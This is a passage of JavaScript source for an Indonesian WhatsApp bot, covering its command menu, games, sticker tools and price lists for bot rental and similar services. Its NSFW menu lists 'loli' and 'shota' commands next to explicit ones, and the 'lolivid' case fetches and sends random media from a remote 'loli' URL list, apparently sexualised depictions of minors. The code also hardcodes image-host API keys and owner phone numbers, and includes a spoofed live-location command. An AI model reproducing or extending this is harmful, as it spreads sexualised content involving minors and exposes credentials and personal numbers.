│> 🍃 ${prefix}upswimage
│> 🍃 ${prefix}upswvideo
│> 🍃 ${prefix}upswgif
│ 
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 シ︎
│ 
│> 🍃 ${prefix}fitnah
│> 🍃 ${prefix}fitnahpc
│> 🍃 ${prefix}kontak 0|p
│> 🍃 ${prefix}lolivid
│> 🍃 ${prefix}suit
│> 🍃 ${prefix}toxic
│> 🍃 ${prefix}flock
│> 🍃 ${prefix}pantun
│> 🍃 ${prefix}dadu
│> 🍃 ${prefix}asupan
│> 🍃 ${prefix}viewonce
│> 🍃 ${prefix}detikvn number
│> 🍃 ${prefix}detikvideo number
│> 🍃 ${prefix}hbd
│ 
│ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 シ︎
│ 
│> 🍃 ${prefix}yuri
│> 🍃 ${prefix}hentai
│> 🍃 ${prefix}anal
│> 🍃 ${prefix}eroneko
│> 🍃 ${prefix}lesbian
│> 🍃 ${prefix}kitsune
│> 🍃 ${prefix}bj
│> 🍃 ${prefix}pussy
│> 🍃 ${prefix}wallpaper
│> 🍃 ${prefix}neko2
│> 🍃 ${prefix}baka
│> 🍃 ${prefix}slap
│> 🍃 ${prefix}poke
│> 🍃 ${prefix}keta
│> 🍃 ${prefix}awoo
│> 🍃 ${prefix}blowjob
│> 🍃 ${prefix}megumin
│> 🍃 ${prefix}neko
│> 🍃 ${prefix}trapnime
│> 🍃 ${prefix}otaku
│> 🍃 ${prefix}komiku
│> 🍃 ${prefix}chara
│> 🍃 ${prefix}anime
│> 🍃 ${prefix}art
│> 🍃 ${prefix}bts
│> 🍃 ${prefix}exo
│> 🍃 ${prefix}elf
│> 🍃 ${prefix}loli
│> 🍃 ${prefix}waifu
│> 🍃 ${prefix}neko
│> 🍃 ${prefix}shota
│> 🍃 ${prefix}sagiri
│> 🍃 ${prefix}shinobu
│> 🍃 ${prefix}megumin
│> 🍃 ${prefix}wallnime
│> 🍃 ${prefix}chiisaihentai
│> 🍃 ${prefix}trap
│> 🍃 ${prefix}blowjob
│> 🍃 ${prefix}yaoi
│> 🍃 ${prefix}ecchi
│> 🍃 ${prefix}hentai
│> 🍃 ${prefix}ahegao
│> 🍃 ${prefix}hololewd
│> 🍃 ${prefix}sideoppai
│> 🍃 ${prefix}animefeets
│> 🍃 ${prefix}animebooty
│> 🍃 ${prefix}animethighss
│> 🍃 ${prefix}hentaiparadise
│> 🍃 ${prefix}animearmpits
│> 🍃 ${prefix}hentaifemdom
│> 🍃 ${prefix}lewdanimegirls
│> 🍃 ${prefix}biganimetiddies
│> 🍃 ${prefix}animebellybutton
│> 🍃 ${prefix}hentai4everyone
│
│ ❉ 𝐂𝐎𝐍𝐕𝐄𝐑 𝐌𝐄𝐍𝐔𝟐 ❉ 」
│
│> 🍃 ${prefix}tomp3
│> 🍃 ${prefix}tomp4
│> 🍃 ${prefix}slow
│> 🍃 ${prefix}fast
│> 🍃 ${prefix}reverse
│
│ ❉ 𝐓𝐀𝐆 𝐌𝐄𝐍𝐔𝟐
 ❉ 」
│
│> 🍃 ${prefix}hidetag
│> 🍃 ${prefix}totag
│> 🍃 ${prefix}kontag
│> 🍃 ${prefix}sticktag
│
│ ❉ 𝐒𝐓𝐎𝐑𝐀𝐆𝐄 𝐌𝐄𝐍𝐔𝟐 ❉ 」
│
│> 🍃 ${prefix}addvn
│> 🍃 ${prefix}getvn
│> 🍃 ${prefix}listvn
│> 🍃 ${prefix}addsticker
│> 🍃 ${prefix}getsticker
│> 🍃 ${prefix}stickerlist
│> 🍃 ${prefix}addvideo
│> 🍃 ${prefix}getvideo
│> 🍃 ${prefix}listvideo
│> 🍃 ${prefix}addimage
│> 🍃 ${prefix}getimage
│> 🍃 ${prefix}imagelist
│
│ ❉ 𝐆𝐀𝐌𝐄 𝐌𝐄𝐍𝐔𝟐 ❉ 」
│
│>̴ 🚮 ${prefix}math
│>̴ 🚮 ${prefix}tebakgambar
│>̴ 🚮 ${prefix}tembak
│>̴ 🚮 ${prefix}tictactoe
│>̴ 🚮 ${prefix}delttc
│>̴ 🚮 vslot
│>̴ 🚮 slot
│>̴ 🚮 suit2
└──────────────────❒
✩ 𝘑𝘈𝘔 : ${jam}
✩ 𝘏𝘈𝘙𝘐 : ${week} ${weton}
✩ 𝘛𝘢𝘯𝘨𝘨𝘢𝘭 : ${date} 

シ︎ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : ${groups.length} 
シ︎ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : ${privat.length}
シ︎ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : ${totalChat.length}
シ︎ 𝐒𝐩𝐞𝐞𝐝 : ${latensie.toFixed(4)} _Second_
シ︎ 𝐀𝐜𝐭𝐢𝐯𝐞 : ${runtime(process.uptime())}
シ︎ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : ${os.platform()}
`
sendButLocation(from, `${menu}`,`ini tidak menggunakan prefix ya🛐`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 📚 シ︎'},type:1},{buttonId:`${prefix}sewabot`,buttonText:{displayText:'𝙎𝙀𝙒𝘼 𝘽𝙊𝙏🍃シ︎︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break		
case 'credit':
   dtod = '6285157160906'
   dtod1 = '6281212083401'
   dtod2 = '6287721317870'
   dtod3 = '?'
   dtod4 ='0'
   var yez = `
   [ 𝐶𝑟𝑒𝑑𝑖𝑡𝑠 𝐵𝑦 ] :
   
 🌹 : wa.me/6287721317870
 🌹 : wa.me/6281212083401
 🌹 : wa.me/6285157160906
 🌹 : wa.me/0
 🌹 : wa.me/
 `
     credit = KonX.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 1000, "message": `${yez}`, "footerText": "hehe", "thumbnail": iye, "surface": 'CATALOG'}}, {quoted: mek})
            KonX.relayWAMessage(credit)
        break 
               case 'donasi':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 listMsg = {
 buttonText: 'KLIK DISINI',
 footerText: 'MENU BUTTON︎',
 description: `Hai kak @${sender.split('@')[0]},`,
 sections: [
                     {
                      "title": `ini masih test dulu🗿`,
 rows: [
                           {
                        "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {                         
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {                             
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": "d"
                              },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""                       
                           },
                           {
                              "title": "blom gua buat",
                              "description" :"blom gua buat",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
KonX.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:mek})
break
        case 'slot':
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍒 : 🍒') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍐 : 🍐') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
             break
case "suit":
  if (!isRegistered) return reply(mess.ban)
  sendButMessage(from, `Pilih Gunting Kertas Atau Batu`, `case By @Naufal tutor`, [
          {
            buttonId: `${prefix}sutit batu`,
            buttonText: {
              displayText: `BATU`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit gunting`,
            buttonText: {
              displayText: `GUNTING`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit kertas`,
            buttonText: {
              displayText: `KERTAS`,
            },
            type: 1,
          },
        ]);
        break
case 'sutit':
  if (!isRegistered) return reply(mess.ban)
  if (args.length < 1) return reply('Pilih gunting/batu/kertasbrea')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
case 'loliv':
       case 'lolivid':
       case 'lolivideo':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
case 'bugreport':
              if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              KonX.sendMessage('6281212083401@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              
              break
case 'restart':
             if (!isOwner) return 
             reply(mess.wait)
             exec(`node main`)
             reply('_Restarting Bot Success_')
break
case 'tinyurl':
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
KonX.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break
case 'toxic':
              Toxic().then(toxic => {
              reply (toxic)
})
              break
              case 'storyanime': case 'sanime':{
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
reply(mess.wait)
get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=${dapapi}`)
kodi = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
   sendButVideo(from, kodi, `${watermark}`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);         
        }
                    break       
                    case 'store':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 listMsg = {
 buttonText: 'KLIK DISINI',
 footerText: 'MENU BUTTON︎',
 description: `Hai kak @${sender.split('@')[0]}, Silahkan pilih menu store disini`,
 sections: [
                     {
                      "title": `${jam} - ${week} ${weton} - ${date}`,
 rows: [
                           {
                        "title": "hosting",
                              "description" :"🚪Membuka List Harga Hosting.🚪",
                              "rowId": ""
                           },
                           {                         
                              "title": "diamondff",
                              "description" :"🤡Membuka List harga Diamond Ff🤡",
                              "rowId": ""
                           },
                           {                             
                              "title": "diamondml",
                              "description" :"💬Membuka List Harga Diamond Ml💬",
                              "rowId": ""
                           },
                           {
                              "title": "pushkontak",
                              "description" :"✅Membuka List Harga Push Kontak✅",
                              "rowId": ""
                           },
                           {
                              "title": "Jadibot",
                              "description" :"👑Membuka List Harga JaDi Bot👑",
                              "rowId": ""
                           },
                           {
                              "title": "logo",
                              "description" :"🍃Membuka list harga logo🍃",
                              "rowId": ""
                           },
                           {
                              "title": "bengkelsesi",
                              "description" :"⏰Membuka list harga bengkel sesj⏰",
                              "rowId": ""
                           },
                           {
                              "title": "sewabot",
                              "description" :"📙Membuka List Harga Sewa Bo📙",
                              "rowId": ""
                           },
                           {
                              "title": "followerig",
                              "description" :"💫Membuka fitur maker💫",
                              "rowId": ""
                           },
                           {
                              "title": "unchek",
                              "description" :"🔥Membuka list harga akun unchek🔥",
                              "rowId": ""
                           },
                           {
                              "title": "jasher",
                              "description" :"🗿Membuka list harga jasher🗿",
                              "rowId": ""
                           },
                           {
                              "title": "vps",
                              "description" :"🖥️Membuka List Harga Vps🖥️",
                              "rowId": "d"
                              },
                           {
                              "title": "smtp",
                              "description" :"✉️Membuka List Harga smtp✉️",
                              "rowId": ""                       
                           },
                           {
                              "title": "upgradgopay",
                              "description" :"📲Membuka List Harga Upgrade Gopay📲",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
KonX.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:mek})
break
break
case 'quotesyt':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=${dapapi}`)
                KonX.sendMessage(from, dapuhy, image, {quoted: mek})        
                break    
case 'auu': // by KonX
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
       reply('Enggak Kak')
        sendButMessage(from, `Hai Kak ${pushname} 🐤`, `Mau Jawab Apa?`, [
          {
            buttonId: `${prefix}oklah`,
            buttonText: {
              displayText: `kok gitu sih:)`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}apaan6`,
            buttonText: {
              displayText: `Dahlah`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}awokkk`,
            buttonText: {
              displayText: `end:/`,
            },
            type: 1,
          },
        ]);
        break;
        case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} KonX Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX_1.jpg')})
					break

case 'stcmeme':
case 'smeme':
case 'sme':
case 'stickermeme':
 if (!isRegistered)return reply(mess.ban)
  ct = body.slice(9)
              top = ct.split('|')[0]
              bottom = ct.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await KonX.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendStickerFromUrl(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break
case 'stickmeme2':
  case 'smeme2':
if(!c)return reply(`Cara Makeknya, Pertama Reply Stikernya, Kedua ketik : ${prefix + command} Text1|Text2`)
s11 = c.split('|')[0]
s12 = c.split('|')[1] 
if(!s12)return reply('Text2 nya pake bang..')
if (mek.message.extendedTextMessage != undefined || mek.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
owgi = await KonX.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
teks = `${anu.display_url}`
sendStickerUrl(from, `https://cililitan.herokuapp.com/api/memegen2?teks1=${s11}&teks2=${s12}&img_url=${teks}`, mek)
fs.unlinkSync('./stickmeme.jpeg')
}
break
        case 'tahta':
					if (args.length < 1) return reply('Teksnya om')
					anu = `https://app-botpri.herokuapp.com/api/maker/harta-tahta?apikey=${indoapi}&text=${args.join(' ')}`
					voss = await fetch(anu)
					ftype = require('file-type')
					vuss = await ftype.fromStream(voss.body)
					if (vuss !== undefined) {
						KonX.sendMessage(from, await getBuffer(anu), image, { quoted: mek, caption: mess.sucess })
					} else {
						reply('Terjadi kesalahan')
					}
					break
        case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
case 'oklah':
reply(':v')
break
case 'apaan6':
reply('oke slur')
break
case 'awokkk':
reply('iyalah masa engga')
break

case 'isbaileys': 
case 'bail': 
case 'baileys':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
if (!mek.key.fromMe) return;
reply(`${mek.quoted.isBaileys}`)
break
case 'diamondml':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Gk ada dm dm an🗿`
    sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break

case 'diamondff':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6281392502321@s.whatsapp.net"
        dtod = '6281392502321'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Gk ada Dm dm an🗿☕`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'hosting':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Gk ad Hoting² an🗿☕`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'jadibot':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6281392502321@s.whatsapp.net"
        dtod = '6281392502321'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
       
╭──「 *_JADI BOT + OWNER_* 」
│❏   RP : IDR 30.000 (30K)
╰────
╭─ [ FASILITAS ]
│❏  CUMA SCAN QR DOANG JADI                
│     BOT + OWNER
│❏  FITUR BOT NYA BANYAK
│❏  BANYAK FITUR LANGKA
╰────
╭─[ KEUNTUNGAN ]
│❏  BISA OPEN SEWA BOT
╰────
╭─[ *MINAT CHAT* ]
│❏  📮 KETIK OWNER
╰─── `
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'sewabot':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
       *OPEN SEWA BOT*
╭──「 *SEWA BOT* 」
│❏  1 MINGGU : IDR 10.000 (10K)
│❏  1 BULAN : IDR 15.000 (15K)
│❏   PERMANEN : IDR 20.000 (20K)
╰────
╭─ [ KELEBIHAN BOT ]
│❏  *OＮ 24 ＪAＭ* (KetikaJaringanBagus)
│❏  WELCOME IMAGE
│❏ ANTI LINK
│❏ HIDETAG
│❏ TAG ALL
│❏  FITUR LANGKA
╰────
╭─[ KEUNTUNGAN ]
│❏  ANTI LINK ( AUTO KICK )
│❏  WELCOME 
│❏  DAN RATUSAN FITUR LAINYA
╰────
╭─[ *MINAT CHAT* ]
│❏  📮 KETIK Owner
╰────
╭─[ *TES BOT? MASUK GRUB DI BAWAH* ]
│❏ https://bit.ly/NaufalXAtak
╰────
╭─[ *PAYMENT* ]
│❏  GOPAY
│❏  PULSA +5K
╰────
*_BOT ON DI TERMUX🗿 _*
*_____________________________*`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'upgradegopay':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
Gk ada `
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'followerig':
   groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
